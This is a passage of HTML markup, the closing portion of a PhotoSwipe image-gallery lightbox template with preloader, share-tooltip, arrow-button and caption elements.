                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>




</html>
